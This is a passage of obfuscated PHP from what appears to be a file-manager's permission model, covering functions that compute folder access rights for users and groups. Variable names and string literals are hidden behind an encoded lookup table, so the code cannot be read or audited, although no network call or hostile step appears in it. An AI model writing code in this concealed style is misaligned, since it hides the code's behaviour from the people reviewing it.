array_merge(array(intval($„«—Êºî)), array_reverse($ºûüûŸš)); $•üîî¯ = $this->sourceAuthSelect($øæ°–ï); $ŞÓ¸øéÒ = $GLOBALS[$¾¼ˆŸÓ[6]][$¾¼ˆŸÓ[92]][$¾¼ˆŸÓ[2233]] == 1; $–Ë€•¦ = $ŞÓ¸øéÒ ? 3 : 2; $åù´úŠ¼ = Model($¾¼ˆŸÓ[1439])->getInfo($†ùÉæ¤³[$¾¼ˆŸÓ[596]]); $ÄÇçÎÆ = explode($¾¼ˆŸÓ[50], trim($åù´úŠ¼[$¾¼ˆŸÓ[611]], $¾¼ˆŸÓ[50])); $ï×ıÚñê = array_merge(array($åù´úŠ¼[$¾¼ˆŸÓ[1441]]), array_reverse(array_slice($ÄÇçÎÆ, $–Ë€•¦))); foreach ($•üîî¯ as $„«—Êºî => $Ö”øìÉ¿) { foreach ($Ö”øìÉ¿ as $õÚá·ãÖ) { if (!$õÚá·ãÖ || !$õÚá·ãÖ[$¾¼ˆŸÓ[596]] || $õÚá·ãÖ[$¾¼ˆŸÓ[596]] == $¾¼ˆŸÓ[229]) { continue; } if ($õÚá·ãÖ[$¾¼ˆŸÓ[189]] != SourceModel::TYPE_GROUP) { continue; } $ï×ıÚñê[] = $õÚá·ãÖ[$¾¼ˆŸÓ[596]]; } } $ï×ıÚñê = array_unique($ï×ıÚñê); $Û¼¤Ä›÷ = array($¾¼ˆŸÓ[429] => _get($GLOBALS[$¾¼ˆŸÓ[7]], $¾¼ˆŸÓ[429], 1), $¾¼ˆŸÓ[440] => _get($GLOBALS[$¾¼ˆŸÓ[7]], $¾¼ˆŸÓ[440], 500)); $GLOBALS[$¾¼ˆŸÓ[7]][$¾¼ˆŸÓ[429]] = 1; $GLOBALS[$¾¼ˆŸÓ[7]][$¾¼ˆŸÓ[440]] = 500; $®²Ñ¼ÉÙ = array($¾¼ˆŸÓ[515] => 0, $¾¼ˆŸÓ[2134] => AuthModel::authAll(), $¾¼ˆŸÓ[516] => LNG($¾¼ˆŸÓ[2313]), $¾¼ˆŸÓ[2149] => $¾¼ˆŸÓ[2314]); $ìÄ½›‘Ä = array(); $¡ùÚ¸Ì = explode($¾¼ˆŸÓ[50], $¾¼ˆŸÓ[2315]); $ˆÈÃğ×Í = explode($¾¼ˆŸÓ[50], $¾¼ˆŸÓ[2316]); foreach ($ï×ıÚñê as $©ğá”¯À) { $‚šÅÔÈê = Model($¾¼ˆŸÓ[1439])->getInfo($©ğá”¯À); $¯É¡¼Ğí = array_field_key($‚šÅÔÈê, $¡ùÚ¸Ì); $§‚™ñ = Model($¾¼ˆŸÓ[624])->listByGroup($©ğá”¯À); foreach ($§‚™ñ[$¾¼ˆŸÓ[446]] as $—˜ì‡Óº => $õß¿â±Ë) { $this->userGroupList($õß¿â±Ë[$¾¼ˆŸÓ[1539]], $õß¿â±Ë); $ú›€İ˜à = $õß¿â±Ë[$¾¼ˆŸÓ[1539]] . $¾¼ˆŸÓ[12]; if (isset($ìÄ½›‘Ä[$ú›€İ˜à])) { continue; } $ˆäº§ßŸ = Model($¾¼ˆŸÓ[2317])->listData($õß¿â±Ë[$¾¼ˆŸÓ[2318]]); $õß¿â±Ë[$¾¼ˆŸÓ[2319]] = Action($¾¼ˆŸÓ[2320])->parseUrl($õß¿â±Ë[$¾¼ˆŸÓ[2319]]); $õß¿â±Ë[$¾¼ˆŸÓ[1887]] = $ˆäº§ßŸ && $ˆäº§ßŸ[$¾¼ˆŸÓ[2321]] == 1; $¢ÌØßã¤ = $this->groupRootAuth($©ğá”¯À, $õß¿â±Ë[$¾¼ˆŸÓ[1539]]); $¢ÌØßã¤ = $õß¿â±Ë[$¾¼ˆŸÓ[1887]] ? $®²Ñ¼ÉÙ : $¢ÌØßã¤; $ìÄ½›‘Ä[$ú›€İ˜à] = array($¾¼ˆŸÓ[2322] => $¾¼ˆŸÓ[2323], $¾¼ˆŸÓ[2324] => LNG($¾¼ˆŸÓ[2325]), $¾¼ˆŸÓ[2302] => array_field_key($õß¿â±Ë, $ˆÈÃğ×Í), $¾¼ˆŸÓ[509] => $¢ÌØßã¤, $¾¼ˆŸÓ[510] => $¢ÌØßã¤[$¾¼ˆŸÓ[509]], $¾¼ˆŸÓ[2326] => $¯É¡¼Ğí); } } $GLOBALS[$¾¼ˆŸÓ[7]][$¾¼ˆŸÓ[429]] = $Û¼¤Ä›÷[$¾¼ˆŸÓ[429]]; $GLOBALS[$¾¼ˆŸÓ[7]][$¾¼ˆŸÓ[440]] = $Û¼¤Ä›÷[$¾¼ˆŸÓ[440]]; foreach ($•üîî¯ as $„«—Êºî => $Ö”øìÉ¿) { if (!$Ö”øìÉ¿) { continue; } foreach ($Ö”øìÉ¿ as $õÚá·ãÖ) { if (!$õÚá·ãÖ || !$õÚá·ãÖ[$¾¼ˆŸÓ[596]] || $õÚá·ãÖ[$¾¼ˆŸÓ[596]] == $¾¼ˆŸÓ[229]) { continue; } if ($õÚá·ãÖ[$¾¼ˆŸÓ[189]] != SourceModel::TYPE_USER) { continue; } $ú›€İ˜à = $õÚá·ãÖ[$¾¼ˆŸÓ[596]] . $¾¼ˆŸÓ[12]; if (isset($ìÄ½›‘Ä[$ú›€İ˜à])) { continue; } $«Ü´Õ¡‘ = $this->authMake($Ö”øìÉ¿, $ú›€İ˜à); if (!$«Ü´Õ¡‘ || !$«Ü´Õ¡‘[$¾¼ˆŸÓ[2324]]) { continue; } $ìÄ½›‘Ä[$ú›€İ˜à] = array($¾¼ˆŸÓ[2322] => $¾¼ˆŸÓ[2327], $¾¼ˆŸÓ[2324] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[2324]], $¾¼ˆŸÓ[2302] => Model($¾¼ˆŸÓ[624])->getInfoSimpleOuter($ú›€İ˜à), $¾¼ˆŸÓ[509] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[563]], $¾¼ˆŸÓ[510] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[563]][$¾¼ˆŸÓ[509]], $¾¼ˆŸÓ[2326] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[2328]]); } } foreach ($•üîî¯ as $„«—Êºî => $Ö”øìÉ¿) { if (!$Ö”øìÉ¿) { continue; } foreach ($ìÄ½›‘Ä as $ú›€İ˜à => $Ş¹ú) { if ($Ş¹ú[$¾¼ˆŸÓ[2302]][$¾¼ˆŸÓ[1887]] || $Ş¹ú[$¾¼ˆŸÓ[2322]] == $¾¼ˆŸÓ[2327]) { continue; } $«Ü´Õ¡‘ = $this->authMake($Ö”øìÉ¿, $ú›€İ˜à); if (!$«Ü´Õ¡‘ || !$«Ü´Õ¡‘[$¾¼ˆŸÓ[2324]]) { continue; } $ìÄ½›‘Ä[$ú›€İ˜à] = array($¾¼ˆŸÓ[2322] => $¾¼ˆŸÓ[2327], $¾¼ˆŸÓ[2324] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[2324]], $¾¼ˆŸÓ[2302] => $Ş¹ú[$¾¼ˆŸÓ[2302]], $¾¼ˆŸÓ[509] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[563]], $¾¼ˆŸÓ[510] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[563]][$¾¼ˆŸÓ[509]], $¾¼ˆŸÓ[2326] => $«Ü´Õ¡‘[$¾¼ˆŸÓ[2328]]); } } $ìÄ½›‘Ä = array_sort_by($ìÄ½›‘Ä, $¾¼ˆŸÓ[510], $¾¼ˆŸÓ[547]); return $ìÄ½›‘Ä; } public function getAllChildren($àüãíĞª) { $ËÅùú¯ =& $_SERVER[€ä¾™²]; $äü©ú«‹ = Model($ËÅùú¯[1479])->sourceInfo($àüãíĞª); if ($äü©ú«‹[$ËÅùú¯[507]] != $ËÅùú¯[91]) { return $this->sourceListAuth(array($àüãíĞª)); } if ($äü©ú«‹[$ËÅùú¯[189]] != SourceModel::TYPE_GROUP) { return array(); } $·ƒÕéàñ = 1; $³­ÒåÃÀ = array($àüãíĞª); if ($äü©ú«‹[$ËÅùú¯[191]] == $ËÅùú¯[229] && $äü©ú«‹[$ËÅùú¯[596]] != $·ƒÕéàñ) { $³­ÒåÃÀ = $this->groupChidldAllRootSource($äü©ú«‹[$ËÅùú¯[596]]); } $´õ¤¹‚‰ = $this->field($ËÅùú¯[192])->group($ËÅùú¯[192])->select(); $´õ¤¹‚‰ = array_to_keyvalue($´õ¤¹‚‰, $ËÅùú¯[12], $ËÅùú¯[192]); if (!$´õ¤¹‚‰) { return array(); } $ÕÈ³÷¹´ = $ËÅùú¯[2329]; $¼û âğ = array($ËÅùú¯[192] => array($ËÅùú¯[7], $´õ¤¹‚‰), $ËÅùú¯[527] => $ËÅùú¯[229]); $¯û¨œÄ¾ = Model($ËÅùú¯[932])->field($ÕÈ³÷¹´)->where($¼û âğ)->select(); $ƒÏç†Ã = array($àüãíĞª); foreach ($¯û¨œÄ¾ as $ûÈôô‘„) { foreach ($³­ÒåÃÀ as $›á†Ùò„) { $é¡ªßû× = $ËÅùú¯[50] . $›á†Ùò„ . $ËÅùú¯[50]; $ÁÁ½şİé = $ûÈôô‘„[$ËÅùú¯[611]] . $ûÈôô‘„[$ËÅùú¯[192]] . $ËÅùú¯[50]; if (strstr($ÁÁ½şİé, $é¡ªßû×)) { $ƒÏç†Ã[] = $ûÈôô‘„[$ËÅùú¯[192]]; break; } } } return $this->sourceListAuth($ƒÏç†Ã); } private function sourceListAuth($¯†Œ»Ğ) { $¹¥¹›±ã =& $_SERVER[€ä¾™²]; $é®¦‹ï„ = Model($¹¥¹›±ã[1479])->sourceListInfo($¯†Œ»Ğ, !0); $ş¿é¤Ö½ = $this->sourceAuthSelect($¯†Œ»Ğ); $ ßû×¹ì = array(); $ÃÌÄ°„ = array(); foreach ($é®¦‹ï„ as $ãÚ¾ñ°Ï) { unset($ãÚ¾ñ°Ï[$¹¥¹›±ã[550]]); unset($ãÚ¾ñ°Ï[$¹¥¹›±ã[548]]); unset($ãÚ¾ñ°Ï[$¹¥¹›±ã[509]]); unset($ãÚ¾ñ°Ï[$¹¥¹›±ã[90]]); $§““ƒÎÑ = $ş¿é¤Ö½[$ãÚ¾ñ°Ï[$¹¥¹›±ã[192]]]; if (!$§““ƒÎÑ) { continue; } $ãÚ¾ñ°Ï[$¹¥¹›±ã[2326]] = $this->authTargetInfo($§““ƒÎÑ); $ãÚ¾ñ°Ï[$¹¥¹›±ã[609]] = rtrim($ãÚ¾ñ°Ï[$¹¥¹›±ã[615]], $¹¥¹›±ã[8]) . $¹¥¹›±ã[8] . ltrim($ãÚ¾ñ°Ï[$¹¥¹›±ã[609]], $¹¥¹›±ã[8]); $ ßû×¹ì[] = $ãÚ¾ñ°Ï; $îÊ‘Ğ¼Ã = count(explode($¹¥¹›±ã[8], trim($ãÚ¾ñ°Ï[$¹¥¹›±ã[609]], $¹¥¹›±ã[8]))); $ÃÌÄ°„[] = $îÊ‘Ğ¼Ã + ($ãÚ¾ñ°Ï[$¹¥¹›±ã[33]] == $¹¥¹›±ã[78] ? 0 : 1000); } array_multisort($ÃÌÄ°„, SORT_ASC, $ ßû×¹ì); return $ ßû×¹ì; } private function groupChidldAllRootSource($ àúú¸À) { $ãı˜¨Õ =& $_SERVER[€ä¾™²]; $Í€½—±¾ = Model($ãı˜¨Õ[1439])->groupChildrenAll($ àúú¸À); $í³¾Í•Ö = array($ãı˜¨Õ[191] => 0, $ãı˜¨Õ[596] => array($ãı˜¨Õ[7], $Í€½—±¾), $ãı˜¨Õ[189] => SourceModel::TYPE_GROUP); $Ô¹Ìª»ç = Model($ãı˜¨Õ[932])->field($ãı˜¨Õ[192])->where($í³¾Í•Ö)->select(); $Ô¹Ìª»ç = array_to_keyvalue($Ô¹Ìª»ç, $ãı˜¨Õ[12], $ãı˜¨Õ[192]); return $Ô¹Ìª»ç; } private function authTargetInfo($¾Ö³’·´) { $‰Îïüù =& $_SERVER[€ä¾™²]; $ß‚´Í÷ = array(); $¤İ™‘ü¿ = array(); $¼Á¼›ï² = 2 << 25; foreach ($¾Ö³’·´ as $§³é¦À) { $Çî÷šòª = Model($‰Îïüù[598])->listData($§³é¦À[$‰Îïüù[1586]]); if (!$Çî÷šòª) { continue; } if ($§³é¦À[$‰Îïüù[189]] == SourceModel::TYPE_USER) { $ˆçå¥¨÷ = Model($‰Îïüù[604])->getInfoSimpleOuter($§³é¦À[$‰Îïüù[596]]); if ($ˆçå¥¨÷[$‰Îïüù[1539]] == $‰Îïüù[1323]) { continue; } if ($ˆçå¥¨÷[$‰Îïüù[1539]] == $‰Îïüù[229]) { $ˆçå¥¨÷[$‰Îïüù[32]] = LNG($‰Îïüù[2330]); } } else { $ˆçå¥¨÷ = Model($‰Îïüù[612])->getInfoSimple($§³é¦À[$‰Îïüù[596]]); } if (!$ˆçå¥¨÷) { continue; } $ˆçå¥¨÷[$‰Îïüù[563]] = $Çî÷šòª; $ß‚´Í÷[] = $ˆçå¥¨÷; $Ú“Ş¾¥Ç = 0; if ($§³é¦À[$‰Îïüù[189]] == SourceModel::TYPE_GROUP) { $Ú“Ş¾¥Ç = $¼Á¼›ï² * 2; } if ($§³é¦À[$‰Îïüù[189]] == SourceModel::TYPE_USER) { $Ú“Ş¾¥Ç = $¼Á¼›ï²; } if ($§³é¦À[$‰Îïüù[189]] == SourceModel::TYPE_USER && $§³é¦À[$‰Îïüù[596]] == $‰Îïüù[229]) { $Ú“Ş¾¥Ç = 0; } $¤İ™‘ü¿[] = $Çî÷šòª[$‰Îïüù[509]] + $Ú“Ş¾¥Ç; } array_multisort($¤İ™‘ü¿, SORT_DESC, $ß‚´Í÷); return $ß‚´Í÷; } public function getAllChildrenByUser($§ŞºÏ™, $¿™ó™à¢) { $ñŞñå© =& $_SERVER[€ä¾™²]; $Ç›™ˆÍ = Model($ñŞñå©[624])->getInfo($¿™ó™à¢); if (!$¿™ó™à¢ || !$§ŞºÏ™ || !$Ç›™ˆÍ) { return array(); } $¼ûÓşô = Model($ñŞñå©[1479])->sourceInfo($§ŞºÏ™); $ÈÊİî¹Î = array(); $İ§ğÚ = 1; if ($¼ûÓşô[$ñŞñå©[191]] == $ñŞñå©[229] && $¼ûÓşô[$ñŞñå©[596]] != $İ§ğÚ && $this->groupContainUser($¼ûÓşô[$ñŞñå©[596]], $¿™ó™à¢)) { foreach ($Ç›™ˆÍ[$ñŞñå©[1440]] as $ øÉÂµ”) { $–º€æ‡’ = Model($ñŞñå©[612])->getInfo($ øÉÂµ”[$ñŞñå©[1441]]); $…èÏäïş = Model($ñŞñå©[624])->getInfoSimpleOuter($¿™ó™à¢); $…èÏäïş[$ñŞñå©[563]] = $ øÉÂµ”[$ñŞñå©[509]]; if (Model($ñŞñå©[598])->authCheckAction($ øÉÂµ”[$ñŞñå©[509]][$ñŞñå©[509]], $ñŞñå©[1511])) { continue; } $°ø®ÔÉ  = array($ñŞñå©[32] => $ñŞñå©[1342] . $–º€æ‡’[$ñŞñå©[32]], $ñŞñå©[192] => $–º€æ‡’[$ñŞñå©[90]][$ñŞñå©[192]], $ñŞñå©[87] => KodIO::make($–º€æ‡’[$ñŞñå©[90]][$ñŞñå©[192]]), $ñŞñå©[191] => $ñŞñå©[229], $ñŞñå©[189] => $ñŞñå©[605], $ñŞñå©[33] => $ñŞñå©[646], $ñŞñå©[609] => $–º€æ‡’[$ñŞñå©[616]], $ñŞñå©[1441] => $–º€æ‡’[$ñŞñå©[1441]], $ñŞñå©[613] => $–º€æ‡’[$ñŞñå©[191]], $ñŞñå©[2326] => array($…èÏäïş)); $ÈÊİî¹Î[$°ø®ÔÉ [$ñŞñå©[192]]] = $°ø®ÔÉ ; } } $Ÿ ÛÚ€ù = array(); $»ÀëÔ…˜ = $this->getAllChildren($§ŞºÏ™); foreach ($»ÀëÔ…˜ as $×ÙŒ¯Ğœ) { $Á»çğ¸à = !1; foreach ($×ÙŒ¯Ğœ[$ñŞñå©[2326]] as $ºÏ³îŸ) { if ($ºÏ³îŸ[$ñŞñå©[1539]]) { if ($ºÏ³îŸ[$ñŞñå©[1539]] == $¿™ó™à¢) { $Á»çğ¸à = !0; break; } } if ($ºÏ³îŸ[$ñŞñå©[1441]]) { if ($this->groupContainUser($ºÏ³îŸ[$ñŞñå©[1441]], $¿™ó™à¢)) { $Á»çğ¸à = !0; break; } } } if ($Á»çğ¸à) { $Ÿ ÛÚ€ù[] = $×ÙŒ¯Ğœ; } $¼Í·…¬Ê = $×ÙŒ¯Ğœ[$ñŞñå©[192]]; if (isset($ÈÊİî¹Î[$¼Í·…¬Ê])) { $×ÙŒ¯Ğœ[$ñŞñå©[2326]][] = $ÈÊİî¹Î[$¼Í·…¬Ê][0]; $ÈÊİî¹Î[$¼Í·…¬Ê] = !1; } } $ÈÊİî¹Î = array_filter(array_values($ÈÊİî¹Î)); $Ÿ ÛÚ€ù = array_merge($ÈÊİî¹Î, $Ÿ ÛÚ€ù); return $Ÿ ÛÚ€ù; } public function setAllChildrenByUser($‰ şè , $¡¬Ğ¯•¬, $‚£Ò•¬) { $™¿İ¡»Î =& $_SERVER[€ä¾™²]; $õ«ÛœÆ = $this->getAllChildrenByUser($‰ şè , $¡¬Ğ¯•¬); if (!$‚£Ò•¬ || !$õ«ÛœÆ) { return !1; } foreach ($õ«ÛœÆ as $²ªîª©ô) { $ÃÕê‡Íš = array(); foreach ($²ªîª©ô[$™¿İ¡»Î[2326]] as $ÈûÀâèû) { $§ŞÇç…« = $ÈûÀâèû[$™¿İ¡»Î[563]]; $ÁóŠàú½ = $ÈûÀâèû[$™¿İ¡»Î[1539]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ñ­ÃÛß = $ÈûÀâèû[$™¿İ¡»Î[1539]] ? $ÈûÀâèû[$™¿İ¡»Î[1539]] : $ÈûÀâèû[$™¿İ¡»Î[1441]]; if ($ÈûÀâèû[$™¿İ¡»Î[1539]] && $ÈûÀâèû[$™¿İ¡»Î[1539]] == $¡¬Ğ¯•¬) { continue; } $ÃÕê‡Íš[] = array($™¿İ¡»Î[192] => $²ªîª©ô[$™¿İ¡»Î[192]], $™¿İ¡»Î[189] => $ÁóŠàú½, $™¿İ¡»Î[596] => intval($Ñ­ÃÛß), $™¿İ¡»Î[1586] => isset($§ŞÇç…«[$™¿İ¡»Î[486]]) ? intval($§ŞÇç…«[$™¿İ¡»Î[486]]) : 0, $™¿İ¡»Î[2290] => isset($§ŞÇç…«[$™¿İ¡»Î[2290]]) ? intval($§ŞÇç…«[$™¿İ¡»Î[2290]]) : -1); } $ÃÕê‡Íš[] = array($™¿İ¡»Î[192] => $²ªîª©ô[$™¿İ¡»Î[192]], $™¿İ¡»Î[189] => SourceModel::TYPE_USER, $™¿İ¡»Î[596] => intval($¡¬Ğ¯•¬), $™¿İ¡»Î[1586] => intval($‚£Ò•¬), $™¿İ¡»Î[2290] => -1); $this->where(array($™¿İ¡»Î[513] => $²ªîª©ô[$™¿İ¡»Î[192]]))->delete(); $this->addAll($ÃÕê‡Íš); } return !0; } public function get($ó°œĞ’£) { $“ß©”–Ş = $this->getSourceList(array($ó°œĞ’£), !0); return $“ß©”–Ş[0]; } public function getSourceList($Ğ¦­•»˜, $ºÓ™ìæ¯ = false, $¿ë ¹ì¥ = false) { $ğ¿¿İÑÊ =& $_SERVER[€ä¾™²]; if (!$Ğ¦­•»˜) { return array(); } $Ş‰ÓË¹â = Model($ğ¿¿İÑÊ[1479]); if (!$ºÓ™ìæ¯ && count($Ğ¦­•»˜) == 1) { $ºÓ™ìæ¯ = array(); $ºÓ™ìæ¯[$Ğ¦­•»˜[0]] = $Ş‰ÓË¹â->sourceInfo($Ğ¦­•»˜[0]); } if (!$ºÓ™ìæ¯) { $”Àü¯õ¾ = array($ğ¿¿İÑÊ[513] => array($ğ¿¿İÑÊ[514], $Ğ¦­•»˜)); $ºÓ™ìæ¯ = $Ş‰ÓË¹â->field($ğ¿¿İÑÊ[2331])->where($”Àü¯õ¾)->select(); $ºÓ™ìæ¯ = array_to_keyvalue($ºÓ™ìæ¯, $ğ¿¿İÑÊ[192]); } $ÀàîÏïæ = $Ğ¦­•»˜; foreach ($ºÓ™ìæ¯ as $»„ÔÃ®² => $öÂ÷¬‡) { $Î™´Â” = $Ş‰ÓË¹â->parentLevelArray($öÂ÷¬‡[$ğ¿¿İÑÊ[611]]); $ÀàîÏïæ = array_merge($ÀàîÏïæ, array(intval($»„ÔÃ®²)), array_reverse($Î™´Â”)); } $ÀàîÏïæ = array_values(array_unique($ÀàîÏïæ)); if (!$ÀàîÏïæ) { return array(); } $ŠÇ„úÅß = $this->sourceAuthSelect($ÀàîÏïæ); $‰¾Ô–À = array(); foreach ($ÀàîÏïæ as $£êÊÚùÏ) { if (isset($ŠÇ„úÅß[$£êÊÚùÏ])) { $‰¾Ô–À[$£êÊÚùÏ] = $ŠÇ„úÅß[$£êÊÚùÏ]; } } $ÛÕÁìšô = $this->userIsRoot($¿ë ¹ì¥); $¯›ôóÏ = AuthModel::authAll(); $˜®×’ø­ = array($ğ¿¿İÑÊ[510] => $¯›ôóÏ, $ğ¿¿İÑÊ[2332] => array($ğ¿¿İÑÊ[515] => 0, $ğ¿¿İÑÊ[2134] => $¯›ôóÏ, $ğ¿¿İÑÊ[516] => LNG($ğ¿¿İÑÊ[2313]), $ğ¿¿İÑÊ[2149] => $ğ¿¿İÑÊ[2314])); $‚ğØ½»¢ = array(); foreach ($ºÓ™ìæ¯ as $£êÊÚùÏ => $ÄüÓïìü) { if ($ÛÕÁìšô && $GLOBALS[$ğ¿¿İÑÊ[6]][$ğ¿¿İÑÊ[2147]]) { $‚ğØ½»¢[$£êÊÚùÏ] = $˜®×’ø­; continue; } $‚ğØ½»¢[$£êÊÚùÏ] = $this->makeSourceAuth($ÄüÓïìü, $‰¾Ô–À, $¿ë ¹ì¥); } return $‚ğØ½»¢; } public function authDeepCheck($§¶º‰şß, $°÷ƒ»À€ = false) { $éÀ×½°ù =& $_SERVER[€ä¾™²]; $°÷ƒ»À€ = $°÷ƒ»À€ ? $°÷ƒ»À€ : USER_ID; $‰¥€È”Ş = $this->makeAuthDeep($°÷ƒ»À€); if (!in_array($§¶º‰şß, $‰¥€È”Ş[$éÀ×½°ù[2333]])) { return !1; } $ù›ğİß„ = array(); foreach ($‰¥€È”Ş[$éÀ×½°ù[2334]] as $Û¿©ò§© => $å´Ëñ›¿) { if (!in_array($§¶º‰şß, $å´Ëñ›¿)) { continue; } $ù›ğİß„[] = $Û¿©ò§©; } if (!$ù›ğİß„) { return !1; } $¼¹ÔÔì = $ù›ğİß„ ? $ù›ğİß„[0] : $§¶º‰şß; return array($éÀ×½°ù[510] => -1, $éÀ×½°ù[563] => array($éÀ×½°ù[515] => $éÀ×½°ù[1323], $éÀ×½°ù[2134] => $éÀ×½°ù[229], $éÀ×½°ù[516] => LNG($éÀ×½°ù[2335]), $éÀ×½°ù[2149] => $éÀ×½°ù[2336]), $éÀ×½°ù[2324] => LNG($éÀ×½°ù[2337]), $éÀ×½°ù[2338] => $this->sourceAuthInfo($¼¹ÔÔì)); } protected function makeAuthDeep($¼…Ùûî = false) { $åÌ¾Ğ´Î =& $_SERVER[€ä¾™²]; static $ĞûÀá÷ = array(); $¼…Ùûî = $¼…Ùûî ? $¼…Ùûî : USER_ID; if (isset($ĞûÀá÷[$¼…Ùûî])) { return $ĞûÀá÷[$¼…Ùûî]; } $–Á¤÷è¶ = Model($åÌ¾Ğ´Î[2339])->listData(); $Ë¤£ÆÈã = array(); foreach ($–Á¤÷è¶ as $èšÛä°) { if ($èšÛä°[$åÌ¾Ğ´Î[509]] == 0 && $èšÛä°[$åÌ¾Ğ´Î[2148]] == $åÌ¾Ğ´Î[91]) { $Ë¤£ÆÈã[] = $èšÛä°[$åÌ¾Ğ´Î[486]]; } } $Ó†Œ®‰ = $this->userGroupParents($¼…Ùûî); $Å°ú€”³ = array($åÌ¾Ğ´Î[189] => SourceModel::TYPE_USER, $åÌ¾Ğ´Î[596] => $¼…Ùûî); if ($Ó†Œ®‰) { $Å°ú€”³ = array(array($åÌ¾Ğ´Î[189] => SourceModel::TYPE_USER, $åÌ¾Ğ´Î[596] => $¼…Ùûî), array($åÌ¾Ğ´Î[189] => SourceModel::TYPE_GROUP, $åÌ¾Ğ´Î[596] => array($åÌ¾Ğ´Î[514], $Ó†Œ®‰)), $åÌ¾Ğ´Î[1113] => $åÌ¾Ğ´Î[2228]); } $Ü•œ™½ˆ = $this->field($åÌ¾Ğ´Î[2340])->where($Å°ú€”³)->select(); $Şëİûßş = array(); $èŞœ„™î = array_to_keyvalue_group($Ü•œ™½ˆ, $åÌ¾Ğ´Î[192]); foreach ($èŞœ„™î as $·‘ÏÇ™ => $Ãˆ“èıÆ) { $À‚¹–«¸ = $this->authArrayCheck($Ãˆ“èıÆ, $¼…Ùûî); if ($À‚¹–«¸[$åÌ¾Ğ´Î[510]] > 0) { $Şëİûßş[] = $·‘ÏÇ™ . $åÌ¾Ğ´Î[12]; } } if ($Ó†Œ®‰) { $­¥ ŞÅÊ = Model($åÌ¾Ğ´Î[612]); foreach ($Ó†Œ®‰ as $«´´ÖÊ´) { $òä×¬îì = $­¥ ŞÅÊ->getInfo($«´´ÖÊ´); if (!$òä×¬îì || !is_array($òä×¬îì[$åÌ¾Ğ´Î[90]])) { continue; } $Şëİûßş[] = $òä×¬îì[$åÌ¾Ğ´Î[90]][$åÌ¾Ğ´Î[192]]; } } $¿Ğ«ßÔã = array(); $×ê‘’Ã = $Ó†Œ®‰; $¾¹Å¼ÛÖ = Model($åÌ¾Ğ´Î[1479]); $­¥ ŞÅÊ = Model($åÌ¾Ğ´Î[612]); $ô©è¥›ˆ = array(); $ÕÖ¼±œ¸ = array(); $‡´Á°·Ì = array(); $Ïá¶à… = array(); if ($Şëİûßş) { $Â¨ŠÉ§‘ = $¾¹Å¼ÛÖ->where(array($åÌ¾Ğ´Î[192] => array($åÌ¾Ğ´Î[514], $Şëİûßş)))->select(); foreach ($Â¨ŠÉ§‘ as $”»ûå) { if ($”»ûå[$åÌ¾Ğ´Î[527]] == $åÌ¾Ğ´Î[91]) { continue; } $¦êóµÛş = $¾¹Å¼ÛÖ->parentLevelArray($”»ûå[$åÌ¾Ğ´Î[611]]); $¿Ğ«ßÔã = array_merge($¿Ğ«ßÔã, $¦êóµÛş); $×ê‘’Ã[] = $”»ûå[$åÌ¾Ğ´Î[596]]; $ô©è¥›ˆ[$”»ûå[$åÌ¾Ğ´Î[192]]] = $¦êóµÛş; $ÕÖ¼±œ¸[$”»ûå[$åÌ¾Ğ´Î[192]]] = $”»ûå[$åÌ¾Ğ´Î[596]]; } } $×ê‘’Ã = array_values(array_unique($×ê‘’Ã)); $Å‹ÚĞµ = $×ê‘’Ã; foreach ($Å‹ÚĞµ as $«´´ÖÊ´) { $òä×¬îì = $­¥ ŞÅÊ->getInfo($«´´ÖÊ´); $¦êóµÛş = $¾¹Å¼ÛÖ->parentLevelArray($òä×¬îì[$åÌ¾Ğ´Î[611]]); $×ê‘’Ã = array_merge($×ê‘’Ã, $¦êóµÛş); } $×ê‘’Ã = array_values(array_unique($×ê‘’Ã)); foreach ($×ê‘’Ã as $«´´ÖÊ´) { $òä×¬îì = $­¥ ŞÅÊ->getInfo($«´´ÖÊ´); $¿Ğ«ßÔã[] = $òä×¬îì[$åÌ¾Ğ´Î[90]][$åÌ¾Ğ´Î[192]]; $‡´Á°·Ì[$«´´ÖÊ´] = $òä×¬îì[$åÌ¾Ğ´Î[90]][$åÌ¾Ğ´Î[192]]; $Ïá¶à…[$«´´ÖÊ´] = $¾¹Å¼ÛÖ->parentLevelArray($òä×¬îì[$åÌ¾Ğ´Î[611]]); } foreach ($ô©è¥›ˆ as $Ø¢ğ¥Ï => $Ä”ÇŞ¬) { $Í¨›®£é = $ÕÖ¼±œ¸[$Ø¢ğ¥Ï]; if (!$Í¨›®£é || !$‡´Á°·Ì[$Í¨›®£é]) { continue; } $œÛ‚¡ƒÏ = array(); foreach ($Ïá¶à…[$Í¨›®£é] as $«´´ÖÊ´) { $œÛ‚¡ƒÏ[] = $‡´Á°·Ì[$«´´ÖÊ´]; } $ô©è¥›ˆ[$Ø¢ğ¥Ï] = array_merge($œÛ‚¡ƒÏ, $Ä”ÇŞ¬); } $¿Ğ«ßÔã = array_values(array_unique($¿Ğ«ßÔã)); $¾¯öãïÉ = array($åÌ¾Ğ´Î[2333] => $¿Ğ«ßÔã, $åÌ¾Ğ´Î[2334] => $ô©è¥›ˆ); $ĞûÀá÷[$¼…Ùûî] = $¾¯öãïÉ; return $¾¯öãïÉ; } private function makeSourceAuth($¸¼Àö©¸, $£Ç§£Æ, $ñœ¦¨Îü = false) { $¸ãÅ¨àİ =& $_SERVER[€ä¾™²]; $‚‘ş¯Õç = $¸ãÅ¨àİ[91]; $÷ áÈ³ = $¸¼Àö©¸[$¸ãÅ¨àİ[596]]; $»æÕ¬ = $¸¼Àö©¸[$¸ãÅ¨àİ[189]] == SourceModel::TYPE_GROUP; $«ûó¿ªÀ = $»æÕ¬ ? $this->groupRootAuth($÷ áÈ³, $ñœ¦¨Îü) : !1; if ($«ûó¿ªÀ && Model($¸ãÅ¨àİ[598])->authCheckAction($«ûó¿ªÀ[$¸ãÅ¨àİ[509]], $¸ãÅ¨àİ[1511])) { return $this->groupAuthInfo($«ûó¿ªÀ, $÷ áÈ³); } $„Çï‘Ì” = Model($¸ãÅ¨àİ[1479])->parentLevelArray($¸¼Àö©¸[$¸ãÅ¨àİ[611]]); $„Çï‘Ì” = array_merge(array($¸¼Àö©¸[$¸ãÅ¨àİ[192]]), array_reverse($„Çï‘Ì”)); $îçÂÙİ³ = !1; foreach ($„Çï‘Ì” as $ÔŞ…øôÆ) { if 